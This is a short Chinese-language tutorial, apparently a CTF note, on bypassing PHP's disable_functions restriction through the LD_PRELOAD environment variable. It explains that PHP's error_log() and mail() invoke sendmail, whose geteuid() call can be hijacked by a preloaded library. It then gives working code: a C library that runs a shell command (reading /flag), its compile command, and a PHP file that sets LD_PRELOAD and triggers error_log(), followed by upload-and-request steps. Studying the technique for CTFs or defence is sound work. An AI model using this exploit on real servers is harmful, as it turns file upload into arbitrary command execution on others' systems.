# Bypass disable\_function

### LD\_PRELOAD

LD\_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高,即加载动态库时先加载LD\_PRLOAD，它可以影响程序的运行时的链接（Runtime linker）。LD\_PRELOAD的功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD\_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error\_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。

payload.c:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
        system("tac /flag > result.txt");
}   

int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```

编译

```
cc -shared -fPIC payload.c -o payload.so

```

payload.php

```php
<?php
putenv("LD_PRELOAD=/var/www/html/payload.so");//注意路径
error_log("text",1,"","");
?>
```

上传payload.so到服务器，在上传payload.php到服务器，然后请求payload.php，既可以运行我们的payload函数
